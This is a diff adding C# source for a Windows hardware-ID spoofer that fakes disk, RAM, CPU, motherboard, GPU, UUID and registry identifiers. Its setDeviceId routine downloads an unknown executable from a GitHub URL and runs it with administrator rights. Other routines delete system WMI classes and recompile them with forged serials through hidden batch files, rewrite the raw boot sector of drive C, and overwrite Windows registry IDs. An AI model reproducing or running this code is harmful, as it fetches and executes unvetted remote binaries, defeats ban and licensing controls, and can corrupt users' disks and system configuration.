@@ -1,0 +1,2316 @@
+```using Microsoft.Win32;
+using System;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Management;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
+using System.Globalization;
+using System.Threading;
+using System.Net;
+using System.Collections.Generic;
+using System.Net.NetworkInformation;
+
+namespace SpooferProject
+{
+    public partial class Control : Form
+    {
+        public Control()
+        {
+            InitializeComponent();
+        }
+        public static Regedit regeditOBJ = new Regedit(@"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001");
+        public static readonly string Key = "HwProfileGuid";
+        public static string hwProfileGuild, MachineGuID, productID, DiskID, motherboard, MAC, UUID, HWID, ComputerHardwareID, WindowsProductID;
+        public class Regedit
+        {
+            private string regeditPath = @"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001";
+            public Regedit(string regeditPath)
+            {
+                this.regeditPath = regeditPath;
+            }
+
+            public string Read(string keyName)
+            {
+                try
+                {
+                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regeditPath))
+                    {
+                        if (key != null)
+                        {
+                            return key.GetValue(keyName).ToString();
+                        }
+                        else
+                        {
+                            //Console.WriteLine("[Regedit] SubKey Doesn't founded!");
+                            return "ERR";
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    //Console.WriteLine("  [Regedit] Error accessing the Registry... Maybe run as admin?\n\n" + ex.ToString());
+                    return "ERR";
+                }
+            }
+        
+            public bool Write(string keyName, object value)
+            {
+                try
+                {
+                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regeditPath))
+                    {
+                        if (key != null)
+                        {
+                            key.SetValue(keyName, value);
+
+                         
+                            return true;
+                        }
+                        else
+                        {
+                            //Console.WriteLine("  [Regedit] SubKey Doesn't founded!");
+                            return false;
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    //Console.WriteLine("  [Regedit] Error accessing the Registry... Maybe run as admin? -" + ex.ToString());
+                    return false;
+                }
+            }
+        }
+
+
+        public static string GetRegID()
+        {
+            return regeditOBJ.Read(Key);
+        }
+
+        public static bool SetRegID(string value)
+        {
+            // Registry anahtarını aç
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001", true);
+
+            if (key != null)
+            {
+                // "HwProfileGuid" değerini "asd" olarak değiştir
+                key.SetValue("HwProfileGuid", value);
+              
+
+                return true;
+            }
+            else
+            {
+                
+                return false;
+                //Console.WriteLine("Belirtilen kayıt defteri anahtarı bulunamadı.");
+            }
+            
+            //return false;
+        }
+        public static bool setdev(string value)
+        {
+            // Registry anahtarını aç
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\TELEMETRY.ASM-WINDOWSSQ", true);
+
+            if (key != null)
+            {
+                // "HwProfileGuid" değerini "asd" olarak değiştir
+                key.SetValue("ETagQueryParameters", value);
+
+
+                return true;
+            }
+            else
+            {
+
+                return false;
+                //Console.WriteLine("Belirtilen kayıt defteri anahtarı bulunamadı.");
+            }
+
+            //return false;
+        }
+
+        bool setDeviceId()
+        {
+            label18.ForeColor = Color.Orange;
+            string url = "https://raw.githubusercontent.com/takkken/spoofs/main/0x12.exe";
+            string hedefKlasor = "C:\\";
+            string hedefDosyaAdi = "slooder.exe";
+            string hedefKonum = Path.Combine(hedefKlasor, hedefDosyaAdi);
+            File.Delete(hedefKonum);
+            bool aga = false;
+
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+            WebClient webClient = new WebClient();
+
+            try
+            {
+                webClient.DownloadFile(url, hedefKonum);
+                try
+                {
+                    ProcessStartInfo processStartInfo = new ProcessStartInfo(hedefKonum);
+                    processStartInfo.Verb = "runas"; // 
+                    Process process = new Process();
+                    process.StartInfo = processStartInfo;
+                    process.Start();
+
+                    process.WaitForExit();
+                    File.Delete(hedefKonum);
+                    aga = true;
+                  
+                        label18.ForeColor = Color.Green;
+                    string metin;//"?IsRetailOS=1&expId=FX%3A119E26AD%2CFX%3A124B38D0%2CFX%3A127FC878%2CFX%3A1283FFE8%2CFX%3A12840617%2CFX%3A128979F9%2CFX%3A128EBD7E%2CFX%3A129135BB%2CFX%3A129E053F%2CFX%3A12A74DB5%2CFX%3A12B8450E%2CFX%3A12BD6E73%2CFX%3A12C3331B%2CFX%3A12C7D66E%2CFX%3A12CDE644%2CFX%3A12D1574C%2CFX%3A12D281C4&sku=48&UtcDataHandlingPolicies=0&OEMModel=All%20Series&AttrDataVer=355&ProcessorModel=Intel%28R%29%20Core%28TM%29%20i7-4790%20CPU%20%40%203.60GHz&FlightingBranchName=&TotalPhysicalRAM=16384&PrimaryDiskType=4&deviceClass=Windows.Desktop&sampleId=14630281&App=utc&IsVirtualDevice=0&OEMName_Uncleaned=ASUS&AppVer=10.0.19041.3636&locale=tr-TR&ms=0&TelemetryLevel=1&osVer=10.0.19045.3693.amd64fre.vb_release.191206-1406&deviceId=s%3AAAAA9DCA-E2E5-4534-9679-4AA029E38A35&os=windows&ring=Retail";
+                    RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+                    RegistryKey registryKey3 = registryKey2.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\TELEMETRY.ASM-WINDOWSSQ", true);
+
+                    metin = registryKey3.GetValue("ETagQueryParameters").ToString();
+                    BulVeYazdir(metin);
+
+                }
+                catch (Exception ex)
+                {
+                    File.Delete(hedefKonum);
+                    aga = false;
+                    label18.ForeColor = Color.Red;
+                    
+                }
+            }
+            catch (Exception ex)
+            {
+                aga = false;
+                label18.ForeColor = Color.Red;
+                MessageBox.Show("Sıra dışı problem! Değiştirilemedi.","Hata!");
+             
+
+            }
+            return aga;
+        }
+
+        public static StringBuilder Log = new StringBuilder();
+        public static bool Spoof()
+        {
+            /*        Log.Clear();
+                    string oldValue = GetValue();
+                    bool result = SetValue("{" + Guid.NewGuid().ToString() + "}");
+                    if (result)
+                    {
+                        Log.Append("  [SPOOFER] HWID Changed from " + oldValue + " to " + GetValue());
+                    }
+                    else
+                    {
+                        Log.AppendLine("  [SPOOFER] Error accessing the Registry... Maybe run as admin");
+                    }
+                    return result;
+              */
+            return true;
+        }
+        public static string GetHWID()
+        {
+            string str = string.Empty;
+            try
+            {
+                foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * FROM WIN32_Processor").Get())
+                    str = managementBaseObject["ProcessorId"].ToString();
+            }
+            catch
+            {
+                str = "FAILED";
+            }
+            return str;
+        }
+       
+        void SetHwid()
+        {
+
+        }
+        public string GetMachineGuid()
+        {
+            var value = "";
+            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
+            {
+                if (key != null)
+                {
+                    value = (string)key.GetValue("MachineGuid");
+                    if (value != null)
+                    {
+              
+                        
+                    }
+                    else
+                    {
+                        value = "ERR";
+                    }
+                }
+                return value;
+            }
+            
+        }
+        public static string GetUUID()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    FileName = "CMD.exe",
+                    Arguments = "/C wmic csproduct get UUID"
+                }
+            };
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.Start();
+            process.WaitForExit();
+            return process.StandardOutput.ReadToEnd();
+
+
+
+
+
+        }
+        static string GetSubstringBetweenPrefixAndSuffix(string input, string prefix, char suffix)
+        {
+            int startIndex = input.IndexOf(prefix);
+            if (startIndex != -1)
+            {
+                startIndex += prefix.Length; // "Win32_VideoController:" sonrasındaki ilk indeks
+                int endIndex = input.IndexOf(suffix, startIndex); // "(" karakterinin indeksi
+                if (endIndex != -1)
+                {
+                    return input.Substring(startIndex, endIndex - startIndex);
+                }
+            }
+            return null;
+        }
+
+        public static string GetDisplayId()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    FileName = "powershell.exe",
+                    Verb = "runas",  // Bu, PowerShell'in yönetici haklarıyla çalışmasını sağlar
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                }
+            };
+
+            process.StartInfo.Arguments = "wmic path win32_videocontroller get PNPDeviceID";
+
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+            return output.Replace("PNPDeviceID","").Trim();
+        }
+        public
+                    bool diskvolume()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\34d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_LogicalDisk");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   VolumeSerialNumber;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_LogicalDisk");
+                sw.WriteLine("{");
+                sw.WriteLine("    VolumeSerialNumber = \"" + textDisk.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\34d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_LogicalDisk");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 34d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\34d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\34d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\34d.xml");
+
+            return true;
+        }
+
+        bool sikiddegis()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\4d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_DiskDrive");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   SerialNumber;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_DiskDrive");
+                sw.WriteLine("{");
+                sw.WriteLine("    SerialNumber = \"" + textSikDrive.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\4d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_DiskDrive");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 4d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\4d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\4d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\4d.xml");
+
+            return true;
+        }
+     
+        bool ramiddegis()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_PhysicalMemory");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   SerialNumber;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_PhysicalMemory");
+                sw.WriteLine("{");
+                sw.WriteLine("    SerialNumber = \"" + textRamBir.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_PhysicalMemory");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 1d.xml");
+            };
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+  //          Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.bat");
+       //     Thread.Sleep(4000);
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\1d.xml");
+
+            return true;
+        }
+        [DllImport("rpcrt4.dll", SetLastError = true)]
+        static extern int UuidCreateSequential(out System.Guid guid);
+
+        public static System.Guid NewGuid()
+        {
+            return CreateSequentialUuid();
+        }
+
+
+        public static System.Guid CreateSequentialUuid()
+        {
+            const int RPC_S_OK = 0;
+            System.Guid g;
+            int hr = UuidCreateSequential(out g);
+            if (hr != RPC_S_OK)
+                throw new ApplicationException("UuidCreateSequential failed: " + hr);
+            return g;
+        }
+        bool ekranid()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_VideoController");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   PNPDeviceID;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_VideoController");
+                sw.WriteLine("{");
+                sw.WriteLine("    PNPDeviceID = \"" + textDisplayNumber.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.bat"))
+            {
+                sww.WriteLine("@echo off");
+               sww.WriteLine("powershell Remove-WMIObject Win32_VideoController");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 9d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+//            Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.bat");
+  //          Thread.Sleep(4000);
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\9d.xml");
+
+            return true;
+        }
+        bool uuiddegis()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_ComputerSystemProduct");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   UUID;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_ComputerSystemProduct");
+                sw.WriteLine("{");
+                if(textUUID.Text.Length < 5)
+                {
+                   
+                    textUUID.Text = NewGuid().ToString();
+                }
+                sw.WriteLine("    UUID = \"" + textUUID.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_ComputerSystemProduct");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 6d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.xml");
+
+            return true;
+        }
+
+        bool hwiddegis()
+        {
+            if (isStarted == false) return false;
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\2d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_Processor");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   ProcessorId;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_Processor");
+                sw.WriteLine("{");
+                sw.WriteLine("    ProcessorId = \"" + textHWID.Text + "\";");
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\2d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_Processor");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 2d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\2d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\2d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\2d.xml");
+
+            return true;
+        }
+        bool AnakartDegis()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\3d.xml"))
+                {
+                    sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                    sw.WriteLine("class Win32_Baseboard");
+                    sw.WriteLine("{");
+                    sw.WriteLine("  [key]");
+                    sw.WriteLine("  string   SerialNumber;");
+                    sw.WriteLine("};");
+                    sw.WriteLine("[DYNPROPS]");
+                    sw.WriteLine("instance of Win32_Baseboard");
+                    sw.WriteLine("{");
+                    sw.WriteLine("    SerialNumber = \"" + textAnakart.Text + "\";");
+                    sw.WriteLine("};");
+                }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\StartDVR.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_Baseboard");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 3d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\StartDVR.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\StartDVR.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\3d.xml");
+
+            return true;
+        }
+        bool SpoofDisk()
+        {
+            if (isStarted == false) return false;
+            string newSerial = textDisk.Text;
+            uint serial = uint.Parse(newSerial, NumberStyles.HexNumber);
+            //     add_log("Volume serial number changing to: " + newSerial + " - " + serial);
+            return ChangeSerialNumber('C', serial);
+            
+        }
+        bool Strncmp(string str, byte[] data, int offset)
+        {
+            for (int i = 0; i < str.Length; ++i)
+            {
+                if (data[i + offset] != (byte)str[i]) return false;
+            }
+            return true;
+        }
+        class Disk : IDisposable
+        {
+            private SafeFileHandle handle;
+
+            public Disk(char volume)
+            {
+                var ptr = CreateFile(
+                    String.Format("\\\\.\\{0}:", volume),
+                    FileAccess.ReadWrite,
+                    FileShare.ReadWrite,
+                    IntPtr.Zero,
+                    FileMode.Open,
+                    0,
+                    IntPtr.Zero
+                    );
+
+                handle = new SafeFileHandle(ptr, true);
+
+                if (handle.IsInvalid) Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
+            }
+
+            public void ReadSector(uint sector, byte[] buffer)
+            {
+                if (buffer == null) throw new ArgumentNullException("buffer");
+                if (SetFilePointer(handle, sector, IntPtr.Zero, EMoveMethod.Begin) == INVALID_SET_FILE_POINTER) Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
+
+                uint read;
+                if (!ReadFile(handle, buffer, buffer.Length, out read, IntPtr.Zero)) Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
+                if (read != buffer.Length) throw new IOException();
+            }
+
+            public void WriteSector(uint sector, byte[] buffer)
+            {
+                if (buffer == null) throw new ArgumentNullException("buffer");
+                if (SetFilePointer(handle, sector, IntPtr.Zero, EMoveMethod.Begin) == INVALID_SET_FILE_POINTER) Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
+
+                uint written;
+                if (!WriteFile(handle, buffer, buffer.Length, out written, IntPtr.Zero)) Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
+                if (written != buffer.Length) throw new IOException();
+            }
+
+            public void Dispose()
+            {
+                Dispose(true);
+                GC.SuppressFinalize(this);
+            }
+
+            protected virtual void Dispose(bool disposing)
+            {
+                if (disposing)
+                {
+                    if (handle != null) handle.Dispose();
+                }
+            }
+
+            enum EMoveMethod : uint
+            {
+                Begin = 0,
+                Current = 1,
+                End = 2
+            }
+
+            const uint INVALID_SET_FILE_POINTER = 0xFFFFFFFF;
+
+            [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+            public static extern IntPtr CreateFile(
+                string fileName,
+                [MarshalAs(UnmanagedType.U4)] FileAccess fileAccess,
+                [MarshalAs(UnmanagedType.U4)] FileShare fileShare,
+                IntPtr securityAttributes,
+                [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
+                int flags,
+                IntPtr template);
+
+            [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+            static extern uint SetFilePointer(
+                 [In] SafeFileHandle hFile,
+                 [In] uint lDistanceToMove,
+                 [In] IntPtr lpDistanceToMoveHigh,
+                 [In] EMoveMethod dwMoveMethod);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern bool ReadFile(SafeFileHandle hFile, [Out] byte[] lpBuffer,
+                int nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+
+            [DllImport("kernel32.dll")]
+            static extern bool WriteFile(SafeFileHandle hFile, [In] byte[] lpBuffer,
+                int nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
+                [In] IntPtr lpOverlapped);
+        }
+
+        bool ChangeSerialNumber(char volume, uint newSerial)
+        {
+            var fsInfo = new[]
+            {
+        new { Name = "FAT32", NameOffs = 0x52, SerialOffs = 0x43 },
+        new { Name = "FAT", NameOffs = 0x36, SerialOffs = 0x27 },
+        new { Name = "NTFS", NameOffs = 0x03, SerialOffs = 0x48 }
+    };
+
+            using (var disk = new Disk(volume))
+            {
+                var sector = new byte[512];
+                disk.ReadSector(0, sector);
+
+                var fs = fsInfo.FirstOrDefault(
+                        f => Strncmp(f.Name, sector, f.NameOffs)
+                    );
+                if (fs == null) throw new NotSupportedException("This file system is not supported");
+
+                var s = newSerial;
+                for (int i = 0; i < 4; ++i, s >>= 8) sector[fs.SerialOffs + i] = (byte)(s & 0xFF);
+
+                disk.WriteSector(0, sector);
+                return true;
+            }
+        }
+        public void GetComputerHardwareID()
+        {
+                    string registryPath = @"SYSTEM\CurrentControlSet\Control\SystemInformation";
+                  string valueName = "ComputerHardwareId";
+    
+            string computerHardwareID = GetRegistryValue(registryPath, valueName);
+            ComputerHardwareID = computerHardwareID;
+        }
+        public string GetRegistryValue2(string registryPath, string valueName)
+        {
+            string keyPath = @"HKEY_LOCAL_MACHINE\" + registryPath;
+            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(registryPath))
+            {
+                if (key != null)
+                {
+                    var value = key.GetValue(valueName);
+                    if (value != null)
+                    {
+                        return value.ToString();
+                    }
+                }
+            }
+
+            return "Değer bulunamadı";
+        }
+        string GetDeviceId()
+        {
+            string registryPath = @"SOFTWARE\Microsoft\SQMClient";
+            string valueName = "MachineId";
+            string sqmid = GetRegistryValue2(registryPath, valueName);
+            return sqmid;
+        }
+        public void GetWindowsProductID()
+        {
+            string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
+            string valueName = "ProductId";
+            string windowsproductid = GetRegistryValue2(registryPath, valueName);
+            WindowsProductID = windowsproductid;
+        }
+        bool SetWindowsProductID(string tasaklarim, string valuename)
+        {
+
+            if (isStarted == false) return false;
+           // string valueName = "ProductId";
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(tasaklarim, true))
+            {
+                if (key != null)
+                {
+                    key.SetValue(valuename, textProductID.Text, RegistryValueKind.String);
+                    //label10.ForeColor = Color.Green;
+
+                    return true;
+                }
+                else
+                {
+                    return false;
+//                    label10.ForeColor = Color.Red;
+                }
+            }
+        }
+        bool SetComputerHardwareID(string tasaklarim, string valunem)
+        {
+            if (isStarted == false) return false;
+            
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(tasaklarim, true))
+            {
+                if (key != null)
+                {
+                    // Yeni değeri kayıt defterine yazın
+                    key.SetValue(valunem, textComputerID.Text, RegistryValueKind.String);
+                    return true;
+                      
+                    
+                }
+                else
+                {
+                    return false;
+                }
+            }
+
+        }
+        static string GetRegistryValue(string registryPath, string valueName)
+        {
+            string key = @"HKEY_LOCAL_MACHINE\" + registryPath;
+            object value = Registry.GetValue(key, valueName, null);
+
+            if (value != null)
+            {
+                return value.ToString();
+            }
+            else
+            {
+                // Belirtilen kayıt defteri değeri bulunamadı.
+                return "Değer bulunamadı";
+            }
+        }
+        private void button2_Click(object sender, EventArgs e)
+        {
+          
+        }
+        public void GetRamID()
+        {
+                   int count = 0;
+                string[] ramId = new string[4];
+                ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
+                ManagementObjectCollection moc = mos.Get();
+                foreach (ManagementObject mo in moc)
+                {
+             //   MessageBox.Show(mo.ToString());
+                   if((string)mo["SerialNumber"] != " " || (string)mo["SerialNumber"] != null)
+                {
+                    ramId[count] = (string)mo["SerialNumber"]; //0D220BFS
+        //            Clipboard.SetText((string)mo["SerialNumber"]);
+          //          MessageBox.Show((string)mo["SerialNumber"]);
+                    count += 1;
+           //         MessageBox.Show(ramId[count].Length.ToString() + " " + ramId[count].ToString());
+                }
+              
+                //MessageBox.Show((string)mo["SerialNumber"]);
+
+            }
+            textRamBir.Text = ramId[0];
+            textRamİki.Text = ramId[1];
+            textRamUc.Text = ramId[2];
+            textRamDort.Text = ramId[3];
+            if (textRamİki.Text == "" || textRamİki.Text == null)
+                textRamİki.Text = "ERROR";
+
+            if (textRamUc.Text == "" || textRamUc.Text == null)
+                textRamUc.Text = "ERROR";
+
+            if (textRamDort.Text == "" || textRamDort.Text == null)
+                textRamDort.Text = "ERROR";
+        }
+       public bool SetMac()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.xml"))
+            {
+
